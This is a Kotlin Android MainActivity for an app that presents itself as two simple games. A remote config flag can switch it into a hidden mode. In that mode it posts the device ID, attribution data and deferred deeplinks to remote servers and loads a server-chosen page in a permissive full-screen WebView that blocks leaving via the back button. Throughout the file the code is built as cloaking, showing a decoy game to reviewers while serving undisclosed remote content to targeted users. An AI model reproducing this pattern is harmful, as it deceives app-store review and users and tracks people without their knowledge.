package com.eviljoker.jokerevil

import android.graphics.Bitmap
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.webkit.*
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.eviljoker.jokerevil.databinding.ActivityMainBinding
import com.eviljoker.jokerevil.myfragments.myfragments1
import com.eviljoker.jokerevil.myfragments.myfragments2
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.onesignal.OneSignal
import org.json.JSONObject
import java.util.*


lateinit var bindingMains : ActivityMainBinding

class MainActivity : AppCompatActivity() {



    /////////////////////


    lateinit var idishniktelephone: Map<String, Any>
    lateinit var setFireConsole: FirebaseRemoteConfig
    var facebooks: String? = null
    var getredirectlinks: String? = null
    var getredirectlink2: String? = null
    var getaps: String? = null
    var webviewsopened: Boolean = false


    /////////////////

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindingMains = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindingMains.root)

        ///////////////////

        val telephnes = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        getaps = telephnes
        firestoreremoteinit()

        ///////////////////

        bindingMains.gameone.setOnClickListener {

            supportFragmentManager
                .beginTransaction()
                .replace(bindingMains.container1.id, myfragments1())
                .commit()

            bindingMains.games.visibility = View.GONE
            bindingMains.container1.visibility = View.VISIBLE
        }
        bindingMains.gametwo.setOnClickListener {

            supportFragmentManager
                .beginTransaction()
                .replace(bindingMains.container2.id, myfragments2())
                .commit()

            bindingMains.games.visibility = View.GONE
            bindingMains.container2.visibility = View.VISIBLE
        }
    }

    private fun firestoreremoteinit() {
        setFireConsole = FirebaseRemoteConfig.getInstance()
        val firestoreedit = FirebaseRemoteConfigSettings.Builder().setMinimumFetchIntervalInSeconds(3600).build()
        setFireConsole.setConfigSettingsAsync(firestoreedit)
        setFireConsole.setDefaultsAsync(R.xml.remote)
        setFireConsole.fetchAndActivate()
            .addOnCompleteListener(this) { task ->
                if (task.isSuccessful) {

                    val checkdoor: Boolean = setFireConsole.getBoolean("open")

                    if (checkdoor == true) {
                        signaltoPushinginit(getaps)
                        getredirectlinks = setFireConsole.getString("redirect1")
                        getredirectlink2 = setFireConsole.getString("redirect2")

                        postAO(getaps!!)
                        facebookinitializations()
                        flyersinits()

                    } else {
                        bindingMains.loadTEXT.visibility = View.GONE
                        bindingMains.lottie.visibility = View.GONE
                        bindingMains.container1.visibility = View.GONE
                        bindingMains.container2.visibility = View.GONE
                        bindingMains.webview.visibility = View.GONE
                        bindingMains.games.visibility = View.VISIBLE


                    }

                } else {
                    bindingMains.loadTEXT.visibility = View.GONE
                    bindingMains.lottie.visibility = View.GONE
                    bindingMains.container1.visibility = View.GONE
                    bindingMains.container2.visibility = View.GONE
                    bindingMains.webview.visibility = View.GONE
                    bindingMains.games.visibility = View.VISIBLE

                }

            }
    }

    private fun flyersinits() {
        AppsFlyerLib.getInstance().setDebugLog(true)

        val connectionsFlyers: AppsFlyerConversionListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(getDataListener: Map<String, Any>) {
                try {
                    idishniktelephone = getDataListener
                    webviewInit(getaps)
                    postAOEACAB(getaps)

                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            override fun onConversionDataFail(errorMessage: String) {
                runOnUiThread {
                    bindingMains.loadTEXT.visibility = View.GONE
                    bindingMains.lottie.visibility = View.GONE
                    bindingMains.container1.visibility = View.GONE
                    bindingMains.container2.visibility = View.GONE
                    bindingMains.webview.visibility = View.GONE
                    bindingMains.games.visibility = View.VISIBLE
                }
            }

            override fun onAppOpenAttribution(attributionData: Map<String, String>) {
                runOnUiThread {
                    bindingMains.loadTEXT.visibility = View.GONE
                    bindingMains.lottie.visibility = View.GONE
                    bindingMains.container1.visibility = View.GONE
                    bindingMains.container2.visibility = View.GONE
                    bindingMains.webview.visibility = View.GONE
                    bindingMains.games.visibility = View.VISIBLE
                }
            }

            override fun onAttributionFailure(errorMessage: String) {
                runOnUiThread {
                    bindingMains.loadTEXT.visibility = View.GONE
                    bindingMains.lottie.visibility = View.GONE
                    bindingMains.container1.visibility = View.GONE
                    bindingMains.container2.visibility = View.GONE
                    bindingMains.games.visibility = View.GONE
                    bindingMains.webview.visibility = View.VISIBLE
                }
            }
        }
        AppsFlyerLib.getInstance().init(keyOpen.APPSFLYER_KEY, connectionsFlyers, this)
        AppsFlyerLib.getInstance().registerConversionListener(this, connectionsFlyers)
        AppsFlyerLib.getInstance().start(this)
    }

    private fun postAOEACAB(apsflr: String?) {

    }

    private fun webviewInit(appsFlyerInit: String?) {
        Log.d("OpenWeb", "OpenWeb")
        val webviewinitVolleys = Volley.newRequestQueue(this)
        val webviewsBody = JSONObject()
        webviewsBody.put("appsFlyerId", getaps)
        val webviewsBodyTwo = JSONObject(idishniktelephone)
        webviewsBody.put("apsInfo", webviewsBodyTwo)
        webviewsBody.put("deeplink", if(facebooks == null) JSONObject.NULL else facebooks)
        var getPostUrl = getredirectlinks
        val jsUrls = object: JsonObjectRequest(
            Request.Method.POST, getPostUrl, webviewsBody,
            { response ->
                if(response.getBoolean("success")) {

                    webviewsopened = true
                    bindingMains.webview.settings.javaScriptEnabled = true
                    bindingMains.webview.settings.domStorageEnabled = true
                    bindingMains.webview.settings.useWideViewPort = true
                    bindingMains.webview.settings.loadWithOverviewMode = true
                    bindingMains.webview.settings.allowFileAccess = true
                    bindingMains.webview.settings.javaScriptCanOpenWindowsAutomatically = true
                    bindingMains.webview.settings.setSupportMultipleWindows(false)
                    bindingMains.webview.settings.displayZoomControls = false
                    bindingMains.webview.settings.builtInZoomControls = true
                    bindingMains.webview.settings.setSupportZoom(true)
                    bindingMains.webview.settings.pluginState = WebSettings.PluginState.ON
                    bindingMains.webview.settings.mixedContentMode = 0
                    bindingMains.webview.settings.setAppCacheEnabled(true)
                    bindingMains.webview.settings.allowContentAccess = true
                    CookieManager.getInstance().setAcceptCookie(true)
                    CookieManager.getInstance().setAcceptThirdPartyCookies(bindingMains.webview, true)
                    val getIDApsflyers: String = AppsFlyerLib.getInstance().getAppsFlyerUID(this)!!
                    bindingMains.webview.webViewClient = object : WebViewClient() {
                        override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                            super.onPageStarted(view, url, favicon)

                        }

                        override fun onPageFinished(view: WebView, url: String) {
                            bindingMains.loadTEXT.visibility = View.GONE
                            bindingMains.lottie.visibility = View.GONE
                            bindingMains.container1.visibility = View.GONE
                            bindingMains.container2.visibility = View.GONE
                            bindingMains.games.visibility = View.GONE
                            bindingMains.webview.visibility = View.VISIBLE
                            apsflyercheckyorconnect(getIDApsflyers, url)
                        }

                        override fun onReceivedHttpError(
                            view: WebView?,
                            request: WebResourceRequest?,
                            errorResponse: WebResourceResponse?
                        ) {
                            super.onReceivedHttpError(view, request, errorResponse)
                            PostAEWConnectings(getIDApsflyers, request!!.url.toString(), errorResponse.toString() + " " + errorResponse!!.statusCode)
                        }

                        @RequiresApi(Build.VERSION_CODES.M)
                        override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
                            super.onReceivedError(view, request, error)
                            PostAEWConnectings(getIDApsflyers, request!!.url.toString(), error.toString())
                        }
                    }
                    bindingMains.webview.loadUrl(response.getString("url"))

                }
                else{
                    bindingMains.loadTEXT.visibility = View.GONE
                    bindingMains.lottie.visibility = View.GONE
                    bindingMains.container1.visibility = View.GONE
                    bindingMains.container2.visibility = View.GONE
                    bindingMains.games.visibility = View.VISIBLE
                    bindingMains.webview.visibility = View.GONE

                }
            }, { error ->
                bindingMains.loadTEXT.visibility = View.GONE
                bindingMains.lottie.visibility = View.GONE
                bindingMains.container1.visibility = View.GONE
                bindingMains.container2.visibility = View.GONE
                bindingMains.games.visibility = View.VISIBLE
                bindingMains.webview.visibility = View.GONE

            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val postGetGolova: MutableMap<String, String> = HashMap()
                postGetGolova["Device-UUID"] = getaps!!
                return postGetGolova
            }
        }
        webviewinitVolleys.add(jsUrls)
    }
    private fun tmOCLCK(): Long {
        val postGetTime: Date = Calendar.getInstance().time
        return postGetTime.time
    }
    private fun PostAEWConnectings(uidStr: String, toString: String, s: String) {
        val postAEWVolley = Volley.newRequestQueue(this)
        val postAEWjsonVolley = JSONObject()
        postAEWjsonVolley.put("name", "a_e_w")
        val postAEWjsonVolleyTwo = JSONObject()
        postAEWjsonVolleyTwo.put("success", true)
        postAEWjsonVolleyTwo.put("url", getredirectlinks)
        postAEWjsonVolleyTwo.put("error", s)

        postAEWjsonVolley.put("data", postAEWjsonVolleyTwo)
        postAEWjsonVolley.put("created", tmOCLCK())
        var postUrlsGet = getredirectlink2

        val AEWPostJsBody = object: JsonObjectRequest(
            Request.Method.POST, postUrlsGet, postAEWjsonVolley,
            { response ->
                Log.i("Volley", "Response is: $response")
            }, { error ->
                Log.i("Volley", "Response is: $error")
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val postGetGolova: MutableMap<String, String> = java.util.HashMap()
                postGetGolova["Device-UUID"] = getaps!!
                return postGetGolova
            }
        }
        postAEWVolley.add(AEWPostJsBody)
    }

    private fun apsflyercheckyorconnect(initAPPSFLR: String, url: String) {
        val postAPFNew = Volley.newRequestQueue(this)
        val APFBody = JSONObject()
        APFBody.put("name", "a_p_f")
        val APFBodyTwo = JSONObject()
        APFBodyTwo.put("success", true)
        APFBodyTwo.put("url", url)
        APFBody.put("data", APFBodyTwo)
        APFBody.put("created", tmOCLCK())
        var APFURL = getredirectlink2

        val APFJSBody = object: JsonObjectRequest(
            Request.Method.POST, APFURL, APFBody,
            { response ->
                Log.i("Volley", "Response is: $response")
            }, { error ->
                Log.i("Volley", "Response is: $error")
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val postGetGolova: MutableMap<String, String> = java.util.HashMap()
                postGetGolova["Device-UUID"] = getaps!!
                return postGetGolova
            }
        }
        postAPFNew.add(APFJSBody)
    }

    private fun facebookinitializations() {

        FacebookSdk.sdkInitialize(applicationContext)
        FacebookSdk.setAdvertiserIDCollectionEnabled(true)
        FacebookSdk.setApplicationId(setFireConsole.getString("fbID"))// вставить фейсбук айди
        Log.d("FBID", "${setFireConsole.getString("fbID")}")
        AppLinkData.fetchDeferredAppLinkData(
            this
        ) {
            if(it==null){
                facebooks = it.toString()
            } else {
                facebooks = it.getTargetUri().toString()
            }
        }
    }

    private fun postAO(str: String) {
        val NewAOPosts = Volley.newRequestQueue(this)
        val AOJSBody = JSONObject()
        AOJSBody.put("name", "a_o")
        val AOJSBodyTwo = JSONObject()
        AOJSBodyTwo.put("success", true)
        AOJSBody.put("data", AOJSBodyTwo)
        AOJSBody.put("created", tmOCLCK())
        var AOURLSpost = getredirectlink2
        val AOPOSTJSBody = object: JsonObjectRequest(
            Request.Method.POST, AOURLSpost, AOJSBody,
            { response ->
                Log.i("VolleyNum1", "Response is: $response")
            }, { error ->
                Log.i("VolleyNum2", "Response is: $error")
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val OCLCK: MutableMap<String, String> = HashMap()
                OCLCK["Device-UUID"] = str
                Log.d("IDDEVICE", "$str")
                return OCLCK
            }
        }
        NewAOPosts.add(AOPOSTJSBody)
    }

    private fun signaltoPushinginit(appsFlyerInit: String?) {
        OneSignal.initWithContext(this)
        OneSignal.setAppId(keyOpen.ONESIGNAL_KEY) // вставить ключь
        OneSignal.setExternalUserId(this.getaps!!, object :
            OneSignal.OSExternalUserIdUpdateCompletionHandler {
            override fun onSuccess(jsonObject: JSONObject) {
                Log.i("OneSignal", jsonObject.toString())
            }

            override fun onFailure(externalIdError: OneSignal.ExternalIdError) {
                Log.i("OneSignal", externalIdError.toString())
            }
        })
    }
    override fun onKeyDown(key: Int, event: KeyEvent?): Boolean {
        if ((key == KeyEvent.KEYCODE_BACK) && bindingMains.webview.canGoBack()) {
            bindingMains.webview.goBack()
            return true
        }

        return super.onKeyDown(key, event)
    }
    override fun onBackPressed() {
        if ( bindingMains.webview.isFocused() &&  bindingMains.webview.canGoBack()) {
            bindingMains.webview.goBack()
        } else {
        }
    }
}